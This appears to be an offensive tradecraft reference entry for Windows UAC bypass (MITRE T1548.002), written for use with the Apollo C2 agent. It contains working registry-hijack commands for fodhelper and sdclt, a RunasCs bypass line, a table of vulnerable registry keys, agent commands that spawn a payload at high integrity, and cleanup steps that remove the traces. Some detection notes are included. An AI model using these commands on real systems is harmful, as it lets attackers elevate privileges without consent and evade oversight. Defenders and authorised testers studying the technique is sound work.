---
name: UAC Bypass Techniques
category: privilege-escalation
subcategories: [uac-bypass, auto-elevate, com-hijack, dll-hijack]
tradecraft_tags: [uac, bypass, auto-elevate, com-hijack, dll-hijack, privilege-escalation]
mitre_attack:
  - id: T1548.002
    name: Abuse Elevation Control Mechanism — Bypass User Account Control
source:
  url: https://attack.mitre.org/techniques/T1548/002/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  UAC bypass techniques typically generate process creation events (parent process
  auto-elevates, spawns child with high integrity). Sysmon Event 1 captures parent/child
  relationships. EDR behavioral analytics flag processes running at high integrity when
  the parent didn't explicitly trigger a UAC prompt. UACME project documents many vectors.
usage_examples:
  - description: UAC bypass via fodhelper.exe (classic, still works on older builds)
    args: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d 'cmd.exe' /f && fodhelper.exe"
  - description: UAC bypass via sdclt.exe
    args: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /ve /d 'cmd.exe' /f && sdclt.exe"
  - description: Check UAC configuration (Seatbelt)
    args: "Seatbelt.exe UAC"
  - description: RunasCs UAC bypass path
    args: "RunasCs.exe administrator Password123 'cmd.exe' --bypass-uac"
opsec_notes: |
  UAC bypass is needed when the current user is in the Administrators group but the
  process token is medium-integrity (standard filtered admin token). Most UAC bypasses
  use auto-elevate COM objects or known executable hijacking. Detection is via process
  elevation anomalies. UAC bypass is not needed if running as SYSTEM or if the token
  is already high-integrity.
gotchas: |
  UAC bypass only elevates from medium-integrity to high-integrity — it does NOT
  provide system-level privileges. If the goal is SYSTEM, use a separate privilege
  escalation path (GodPotato, PrintSpoofer, etc.) after UAC bypass. Many classic
  UAC bypasses are patched in Windows 11 22H2+. Check SharpUp's UAC check for
  the current UAC configuration. UAC bypass leaves registry artifacts in HKCU
  that must be cleaned up.
related_ttps: [sharpup, seatbelt, godpotato, runascs]
alternatives: [uacme, akagi, sharpbypassuac]
common_args: {}
last_updated: 2026-05-29
---

# UAC Bypass Techniques

Reference for User Account Control (UAC) bypass techniques. UAC bypass elevates a
medium-integrity process to high-integrity without triggering a UAC prompt, typically
by abusing auto-elevating COM objects or executable hijacking via HKCU registry entries.

## When UAC Bypass is Needed

```
Current state: Local Admin group member, but process is medium-integrity
  ↓ (UAC prevents elevation, spawns filtered admin token)
  
UAC Bypass: elevated to high-integrity without prompt
  ↓
Goal achieved or next step (privilege escalation to SYSTEM)
```

## Common UAC Bypass Vectors

| Method | Executable | Registry Key | Windows Version |
|--------|-----------|-------------|----------------|
| FodHelper | fodhelper.exe | HKCU\Software\Classes\ms-settings\shell\open\command | 10 / 11 (many versions) |
| sdclt | sdclt.exe | HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe | 10 / 11 |
| ComputerDefaults | ComputerDefaults.exe | HKCU\Software\Classes\ms-settings\shell\open\command | 10 |
| Event Viewer | eventvwr.exe | HKCU\Software\Classes\mscfile\shell\open\command | 7/10 (older) |
| SilentCleanup | cleanmgr.exe | HKCU\Environment\windir | 10 |

## Apollo Usage

```
# Example: FodHelper UAC bypass to spawn high-integrity cmd
Apollo: shell reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe /c <payload>" /f
Apollo: shell fodhelper.exe
# Cleanup:
Apollo: shell reg delete HKCU\Software\Classes\ms-settings /f
```

## Detection State by Windows Version

- **Windows 10 21H2 and older**: Many classic bypasses work
- **Windows 11 22H2+**: Many FodHelper/sdclt bypasses patched; check UACME for current working methods
- **UAC set to "Always Notify"**: Much harder to bypass; most bypasses require default UAC level

## SharpUp UAC Check

SharpUp's `audit` mode includes a UAC configuration check that shows:
- Current UAC level
- Whether bypass is likely feasible
- Token integrity level

Always run `SharpUp.exe UAC` before attempting UAC bypass.
